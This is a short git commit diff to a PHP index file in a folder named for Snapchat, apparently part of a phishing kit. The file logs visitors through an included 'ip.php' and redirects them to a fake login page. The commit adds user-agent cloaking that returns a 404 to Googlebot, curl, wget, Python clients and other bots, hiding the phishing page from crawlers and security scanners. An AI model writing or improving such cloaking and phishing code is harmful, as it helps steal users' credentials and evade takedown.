8e41fc9c5701d980214d6720b78adca74defe9f3
mosean2000 <ayesha1281827@gmail.com>
2025-06-30 14:26:49 +0500

    Update index.php

--- .sites/snapchat/index.php
+++ .sites/snapchat/index.php
@@ -1,5 +1,17 @@
 <?php
+if (isset($_SERVER['HTTP_USER_AGENT'])) {
+    $ua = $_SERVER['HTTP_USER_AGENT'];
+    if (stripos($ua, 'googlebot') !== false || 
+        stripos($ua, 'curl') !== false || 
+        stripos($ua, 'wget') !== false || 
+        stripos($ua, 'python') !== false || 
+        stripos($ua, 'bot') !== false) {
+        header("HTTP/1.0 404 Not Found");
+        exit;
+    }
+}
+
 include 'ip.php';
 header('Location: login.html');
-exit
+exit;
 ?>
